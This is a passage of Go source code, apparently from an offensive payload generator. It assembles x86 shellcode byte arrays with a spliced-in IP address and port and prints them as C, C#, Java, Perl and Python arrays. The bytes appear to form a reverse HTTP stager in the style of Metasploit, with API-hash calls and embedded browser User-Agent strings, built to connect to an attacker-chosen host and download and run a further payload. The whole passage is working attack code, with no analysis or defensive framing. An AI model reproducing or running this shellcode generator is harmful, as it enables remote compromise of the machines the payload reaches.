0x28, 0x8c, 0xda, 0xc3, 0x4d, 0xf2, 0x39, 0x35, 0x6b, 0xc0, 0x33, 0x1e, 0x28, 0x4e, 0x16, 0x5e, 0x22, 0x02, 0x41, 0xe6, 0x94, 0x59, 0xf0, 0xef, 0xc9, 0xe7, 0x87, 0xd7, 0x99, 0x2d, 0x85, 0xe0, 0x6d, 0x0a, 0x65, 0xbb, 0x45, 0x0a, 0x25, 0x78, 0x73, 0x82, 0x04, 0x03, 0x26, 0x14, 0x17, 0x9e, 0x75, 0x23, 0xcd, 0x9d, 0x55, 0x5a, 0xc4, 0x58, 0xd3, 0x4a, 0x22, 0x3e, 0x7d, 0xf8, 0x78, 0xe8, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x35, 0x2e, 0x31, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x31, 0x2e, 0x31, 0x2e, 0x34, 0x33, 0x32, 0x32, 0x29, 0x0d, 0x0a, 0x00, 0x29, 0xd7, 0x5c, 0x05, 0xe8, 0x96, 0x97, 0x83, 0x9e, 0xe0, 0x35, 0x68, 0x08, 0x35, 0xa3, 0x30, 0x03, 0x8a, 0x6e, 0xfc, 0x41, 0x37, 0x21, 0x66, 0x6f, 0xf9, 0xf2, 0xee, 0x73, 0xce, 0xa4, 0xc7, 0x2c, 0x5b, 0x62, 0xf6, 0x49, 0x1e, 0xcd, 0x9f, 0x99, 0x49, 0x4d, 0x1c, 0xb9, 0xf7, 0x36, 0x82, 0x02, 0x6e, 0xdf, 0xbf, 0x09, 0x2b, 0x53, 0x44, 0x28, 0x1b, 0x1d, 0x46, 0x3e, 0x4a, 0xcc, 0x44, 0x41, 0xe3, 0x35, 0xb7, 0xf9, 0x92, 0x53, 0x95, 0x23, 0xe2, 0xae, 0x4b, 0xd6, 0xf9, 0xc1, 0x1b, 0x37, 0x52, 0x99, 0x04, 0xe1, 0xa7, 0x87, 0xdf, 0x21, 0xe2, 0x9b, 0xb5, 0x62, 0xed, 0x19, 0x02, 0xab, 0x09, 0xfb, 0xa3, 0x50, 0x49, 0x6f, 0x20, 0xf3, 0x1f, 0xfe, 0xdc, 0x5e, 0x5f, 0xbc, 0xc2, 0x1e, 0x6f, 0xad, 0x5e, 0x3b, 0xbe, 0x8f, 0x7c, 0x9e, 0x5d, 0x8f, 0x31, 0xb4, 0xe6, 0x6f, 0xda, 0x10, 0xec, 0xdc, 0x35, 0xb1, 0x5a, 0x83, 0xdf, 0x6c, 0x68, 0x01, 0x34, 0x17, 0xca, 0x36, 0x8b, 0xc4, 0x00, 0x6d, 0xf7, 0xe1, 0x58, 0x43, 0x9b, 0x9c, 0xfa, 0x69, 0x11, 0x67, 0xc5, 0xb1, 0xa7, 0xed, 0x29, 0x78, 0xf4, 0x9d, 0x2f, 0x09, 0x07, 0xa1, 0x68, 0xe3, 0x14, 0xb6, 0xc0, 0xe3, 0x12, 0xfb, 0x10, 0xaa, 0xa8, 0x73, 0x73, 0x8e, 0xcc, 0x3a, 0x1c, 0x53, 0xbe, 0x24, 0x8a, 0x23, 0x45, 0xac, 0x54, 0x13, 0x90, 0x23, 0x4b, 0x3d, 0x1c, 0x23, 0xb7, 0x55, 0xe8, 0x6f, 0xb4, 0xf4, 0x8c, 0xdc, 0x93, 0xd9, 0x5c, 0x61, 0x54, 0x53, 0x2d, 0xe1, 0xbd, 0x7a, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		C = C + fmt.Sprintf("0x%02x,", v)
	}
	Cs := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x4c, 0x31, 0x68, 0x77, 0x00, 0x10, 0x58, 0xe7, 0x46, 0xdd, 0xc7, 0xe7, 0x51, 0x0e, 0x94, 0xc4, 0x08, 0xac, 0x3b, 0x7e, 0x21, 0x6f, 0xb9, 0x25, 0xe1, 0xa3, 0xb4, 0x1c, 0x93, 0x1c, 0x2e, 0xf6, 0x6f, 0x17, 0xe2, 0x10, 0x37, 0x7e, 0x07, 0x5b, 0xa1, 0xb1, 0x44, 0xad, 0x5e, 0x67, 0x07, 0xce, 0x5a, 0x37, 0xea, 0x0c, 0xe1, 0x81, 0xe7, 0xe3, 0xef, 0x0f, 0x97, 0x9a, 0x98, 0xf6, 0xb0, 0x0f, 0xd8, 0xf1, 0x68, 0x32, 0xb4, 0xca, 0xfb, 0x66, 0xb1, 0xc2, 0x8c, 0xb5, 0x91, 0xdb, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x37, 0x2e, 0x30, 0x3b, 0x20, 0x72, 0x76, 0x3a, 0x31, 0x31, 0x2e, 0x30, 0x29, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x0d, 0x0a, 0x00, 0x51, 0x6e, 0x88, 0x75, 0xc8, 0xd4, 0xb5, 0x96, 0xf8, 0x14, 0xb6, 0x38, 0xc7, 0x61, 0xbf, 0x2f, 0x09, 0xe5, 0x51, 0x01, 0x34, 0x1c, 0xf2, 0x79, 0x53, 0x31, 0x25, 0xc5, 0x54, 0x4d, 0x2b, 0x8f, 0x16, 0x1d, 0x8c, 0xa1, 0x6f, 0x93, 0x7c, 0x2d, 0x8c, 0x22, 0xe9, 0x4b, 0xfb, 0x56, 0x7e, 0xf2, 0x8c, 0x0e, 0x37, 0xa1, 0x3e, 0x82, 0x7d, 0xd8, 0x01, 0x90, 0x78, 0x56, 0x39, 0xc1, 0xc4, 0xcd, 0x51, 0xef, 0x99, 0x48, 0x2b, 0xb7, 0xe8, 0x47, 0xda, 0x63, 0x50, 0xa1, 0xb6, 0x23, 0x92, 0xa3, 0x64, 0xac, 0x0d, 0x33, 0x15, 0xd6, 0x38, 0x81, 0x1b, 0xb6, 0x5b, 0x9d, 0x55, 0xe7, 0x13, 0xc8, 0xd0, 0x1e, 0x45, 0x3d, 0x47, 0xcb, 0x56, 0xbb, 0xa6, 0xfe, 0x14, 0x58, 0xe1, 0xf1, 0x61, 0x4b, 0xb7, 0x89, 0x10, 0x5e, 0xb8, 0x4d, 0x04, 0x2f, 0xf4, 0x22, 0xfe, 0x53, 0xa5, 0x52, 0x17, 0x49, 0xd9, 0xec, 0xd4, 0x74, 0x29, 0x4f, 0x2d, 0xc9, 0x36, 0xde, 0x34, 0x19, 0x2a, 0x00, 0x93, 0x24, 0xd3, 0x45, 0x09, 0x78, 0x85, 0x8a, 0xca, 0xa5, 0xcd, 0x8a, 0x60, 0x6d, 0x20, 0xe0, 0x1f, 0x1e, 0x97, 0x9f, 0x17, 0x67, 0x8e, 0xcd, 0xfb, 0x78, 0x31, 0xb0, 0xaf, 0x96, 0xf1, 0x2e, 0x2f, 0x7e, 0xbe, 0xe2, 0x38, 0xa1, 0xe9, 0xe3, 0x2e, 0x82, 0x52, 0xea, 0x46, 0xf1, 0xbc, 0xe4, 0x34, 0x9e, 0x5c, 0xe4, 0x70, 0xba, 0x56, 0x98, 0x4d, 0x25, 0xde, 0x39, 0xf5, 0x86, 0x77, 0xfd, 0x6c, 0x2b, 0xbe, 0x6b, 0x05, 0xc4, 0xe3, 0x5e, 0x0c, 0x49, 0x30, 0xea, 0x25, 0xfb, 0xc1, 0xd5, 0x6c, 0x45, 0xfd, 0x80, 0x43, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Cs = Cs + fmt.Sprintf("0x%02x,", v)
	}
	Java := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x5a, 0x42, 0x4e, 0x72, 0x00, 0x6c, 0xd0, 0x4e, 0xd7, 0x25, 0x2e, 0x05, 0x8a, 0x23, 0x4a, 0xcd, 0xab, 0x77, 0xb4, 0xe4, 0x86, 0x4b, 0xf5, 0x16, 0xe0, 0xb0, 0x51, 0xb6, 0xdd, 0x91, 0xd4, 0x6e, 0xe3, 0x66, 0x21, 0xe0, 0x28, 0x03, 0x7c, 0xd6, 0x83, 0xa6, 0x84, 0xcb, 0xf6, 0xe0, 0xd0, 0x0f, 0x1e, 0x74, 0x68, 0xb2, 0x9d, 0xe0, 0x35, 0x6b, 0x52, 0x5b, 0x9e, 0x8f, 0xf2, 0x1f, 0x20, 0x79, 0x7a, 0xd3, 0x73, 0x1e, 0x0d, 0x3f, 0x3e, 0x92, 0xcc, 0xbf, 0xdd, 0x39, 0x35, 0xf6, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x32, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x41, 0x53, 0x55, 0x32, 0x4a, 0x53, 0x29, 0x0d, 0x0a, 0x00, 0x33, 0xd6, 0x6c, 0x3c, 0xd0, 0x41, 0xc6, 0x90, 0x52, 0xec, 0xb6, 0xd5, 0x6e, 0x63, 0x00, 0xe7, 0xbf, 0x96, 0x39, 0x79, 0x15, 0x18, 0x6b, 0xeb, 0x9c, 0x3c, 0x92, 0x52, 0xfb, 0x10, 0x1c, 0xe2, 0xed, 0x81, 0xa3, 0xc6, 0x29, 0x35, 0x95, 0x03, 0x97, 0x35, 0xa0, 0xa1, 0xa0, 0x8f, 0xb0, 0xaa, 0x54, 0x8d, 0x60, 0x6f, 0x44, 0x20, 0x79, 0x0a, 0x95, 0xbd, 0x07, 0xac, 0xe9, 0x8c, 0x82, 0x9f, 0x38, 0x10, 0x4a, 0xfa, 0xbe, 0x87, 0xbd, 0xbe, 0xd2, 0x42, 0x09, 0x91, 0x84, 0x54, 0x56, 0x7a, 0x63, 0xe6, 0xd6, 0x70, 0x47, 0x29, 0x48, 0x03, 0xa3, 0x66, 0x00, 0x08, 0xa5, 0x01, 0xb1, 0xb2, 0xb4, 0x42, 0x23, 0x64, 0xef, 0xf3, 0x5b, 0x61, 0x6e, 0x02, 0xa4, 0x63, 0xd4, 0x1e, 0xf9, 0x77, 0xf9, 0x00, 0x33, 0xe5, 0x88, 0xa9, 0x86, 0x35, 0x1d, 0x9f, 0xf3, 0x16, 0xc6, 0x00, 0x48, 0x34, 0x03, 0x1b, 0x2d, 0xf5, 0x6c, 0x6d, 0x50, 0x42, 0xeb, 0x4b, 0x78, 0xad, 0x41, 0x78, 0xa7, 0x63, 0xbd, 0xe1, 0x70, 0xd4, 0x69, 0xd8, 0xee, 0xbc, 0x95, 0xb2, 0x71, 0xe7, 0x7f, 0xce, 0x6e, 0xc4, 0x0f, 0x9c, 0x10, 0x04, 0xa6, 0xb8, 0x43, 0x40, 0x87, 0x21, 0xe9, 0x8d, 0xe1, 0xf8, 0x14, 0x03, 0x6f, 0x34, 0x50, 0x99, 0x84, 0xca, 0x01, 0x76, 0xbb, 0x1e, 0x73, 0x80, 0xf2, 0xb8, 0x00, 0xb7, 0x4e, 0x36, 0x79, 0xfe, 0xf9, 0x65, 0xa7, 0xbd, 0x59, 0x6f, 0x5d, 0xe2, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Java = Java + fmt.Sprintf("0x%02x,", v)
	}
	Perl := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x39, 0x70, 0x52, 0x61, 0x00, 0xfc, 0x7d, 0x66, 0x43, 0x2f, 0xd3, 0xb2, 0xe0, 0x20, 0x07, 0xb0, 0x6d, 0x6e, 0xa1, 0x15, 0xbb, 0xdb, 0x8d, 0x41, 0x50, 0x8c, 0x02, 0xa4, 0x46, 0x97, 0x71, 0x38, 0x72, 0x12, 0x71, 0x80, 0x9f, 0xb3, 0x2c, 0x22, 0x5f, 0x29, 0x46, 0x0f, 0x97, 0xa6, 0xd6, 0x31, 0x3b, 0x6e, 0xc7, 0x2d, 0x64, 0x38, 0x21, 0x70, 0x92, 0xbf, 0x8c, 0xfd, 0xec, 0x01, 0x94, 0xf9, 0xa2, 0x0c, 0x7c, 0x71, 0x43, 0xa0, 0x60, 0x56, 0x5c, 0xc9, 0xbd, 0x17, 0x96, 0x96, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x4d, 0x41, 0x4d, 0x32, 0x29, 0x0d, 0x0a, 0x00, 0x4f, 0x99, 0x6c, 0x51, 0x96, 0x5b, 0xbe, 0x5f, 0x7c, 0xe3, 0x68, 0xbe, 0x96, 0xb6, 0xe1, 0xb0, 0xdd, 0xc8, 0xd0, 0xa6, 0x46, 0x8c, 0x5b, 0xc8, 0x7f, 0x4d, 0xad, 0x2d, 0x96, 0x50, 0xc4, 0x15, 0xc9, 0x4c, 0xb0, 0xd6, 0x21, 0xf0, 0x79, 0x62, 0xe3, 0x59, 0xc0, 0x8e, 0x06, 0xca, 0x89, 0x1c, 0x95, 0xc6, 0xb4, 0xd2, 0xc5, 0xa9, 0xed, 0x27, 0x28, 0x16, 0xb3, 0x54, 0xaf, 0x74, 0x8e, 0x28, 0x3d, 0xcb, 0x30, 0x15, 0x43, 0x31, 0xb0, 0xcb, 0x91, 0xfd, 0x54, 0x1f, 0x26, 0x0f, 0x42, 0x36, 0x7e, 0x5b, 0xb7, 0x94, 0x5f, 0x7c, 0x51, 0x16, 0x5f, 0x18, 0xe7, 0x03, 0x6e, 0x75, 0x7e, 0xf9, 0xd6, 0x61, 0xd8, 0x1d, 0x0e, 0x07, 0xa8, 0xda, 0x33, 0xdf, 0x33, 0x14, 0x5e, 0x56, 0x4b, 0x82, 0x5a, 0xdb, 0x34, 0x27, 0xd7, 0x12, 0x1a, 0xc5, 0x4a, 0xb6, 0xcb, 0x06, 0x30, 0x64, 0xb8, 0x46, 0xf2, 0x5e, 0x23, 0x97, 0xe8, 0x33, 0x4d, 0xd9, 0xa5, 0x15, 0xb3, 0x43, 0x6e, 0xa4, 0x7b, 0xe9, 0xd5, 0xd5, 0x5d, 0xc7, 0xba, 0xc2, 0xec, 0x8e, 0x05, 0xf9, 0x00, 0x67, 0x57, 0x77, 0xab, 0x64, 0xeb, 0x03, 0x0f, 0xe5, 0x4c, 0xfb, 0x85, 0x31, 0x89, 0x9b, 0xd1, 0xd7, 0x1b, 0x44, 0xab, 0x86, 0x60, 0xcc, 0x18, 0xe7, 0xa9, 0xb4, 0xe8, 0x3c, 0x25, 0x87, 0xa1, 0xa7, 0x74, 0x34, 0x35, 0x55, 0xb4, 0x23, 0xa0, 0x61, 0x70, 0x9b, 0x6c, 0x79, 0xf6, 0x82, 0x61, 0x2f, 0x16, 0x14, 0x6d, 0x00, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xd9, 0x51, 0x53, 0x89, 0xe7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xc6, 0x8b, 0x07, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xe5, 0x58, 0xc3, 0xe8, 0x89, 0xfd, 0xff, 0xff), ip_byte...), 0x00, 0x00, 0x00, 0x00, 0x01) {
		Perl = Perl + fmt.Sprintf("0x%02x,", v)
	}
	Python := ""
	for _, v := range append(append(append(append(head, port_byte...), 0x00, 0x00, 0x53, 0x50, 0x68, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0x50, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x5b, 0x31, 0xd2, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x52, 0x53, 0x52, 0x50, 0x68, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x89, 0xc6, 0x83, 0xc3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xe0, 0x6a, 0x04, 0x50, 0x6a, 0x1f, 0x56, 0x68, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x5f, 0x31, 0xff, 0x57, 0x57, 0x6a, 0xff, 0x53, 0x56, 0x68, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x84, 0xca, 0x01, 0x00, 0x00, 0x31, 0xff, 0x85, 0xf6, 0x74, 0x04, 0x89, 0xf9, 0xeb, 0x09, 0x68, 0xaa, 0xc5, 0xe2, 0x5d, 0xff, 0xd5, 0x89, 0xc1, 0x68, 0x45, 0x21, 0x5e, 0x31, 0xff, 0xd5, 0x31, 0xff, 0x57, 0x6a, 0x07, 0x51, 0x56, 0x50, 0x68, 0xb7, 0x57, 0xe0, 0x0b, 0xff, 0xd5, 0xbf, 0x00, 0x2f, 0x00, 0x00, 0x39, 0xc7, 0x75, 0x07, 0x58, 0x50, 0xe9, 0x7b, 0xff, 0xff, 0xff, 0x31, 0xff, 0xe9, 0x91, 0x01, 0x00, 0x00, 0xe9, 0xc9, 0x01, 0x00, 0x00, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x2f, 0x53, 0x47, 0x48, 0x7a, 0x00, 0xdb, 0xb2, 0x80, 0xc2, 0x1a, 0xa1, 0x54, 0xc4, 0x29, 0x11, 0xb4, 0x31, 0xbc, 0xfd, 0x01, 0x21, 0x54, 0x29, 0x0e, 0x92, 0x3d, 0xe0, 0x56, 0x77, 0x9b, 0xac, 0xf5, 0xe8, 0xd6, 0x75, 0x38, 0x6b, 0xa9, 0xb0, 0x3a, 0x2e, 0x6a, 0x68, 0x9c, 0xe9, 0x76, 0x06, 0x23, 0x60, 0x2e, 0x84, 0x39, 0x21, 0x76, 0xf2, 0x6d, 0x97, 0x2f, 0x90, 0x46, 0x11, 0x29, 0xaa, 0x7a, 0xf2, 0x01, 0x9d, 0x17, 0xe5, 0x90, 0x79, 0x6f, 0x65, 0x4c, 0x1f, 0x9d, 0x1a, 0x5c, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x42, 0x4f, 0x49, 0x45, 0x39, 0x3b, 0x4e, 0x4c, 0x4e, 0x4c, 0x29, 0x0d, 0x0a, 0x00, 0xbb, 0x27, 0xe7, 0x7f, 0xcc, 0xaf, 0xca, 0xf5, 0xb7, 0x11, 0xb0, 0x08, 0x84, 0x6c, 0x78, 0xa2, 0xd7, 0x7c, 0x8b, 0x1e, 0xba, 0x8d, 0xc8, 0xe5, 0x0a, 0x7f, 0x3a, 0x6c, 0x17, 0x72, 0xf7, 0x39, 0xb2, 0x1b, 0xd3, 0xa1, 0xcd, 0xda, 0x53, 0x2b, 0xdb, 0x9c, 0xd3, 0x1d, 0xde, 0xe7, 0xab, 0xb6, 0xb0, 0x38, 0x07, 0xc2, 0x59, 0x40, 0xf7, 0xf3, 0x40, 0xf7, 0xe0, 0xbb, 0xca, 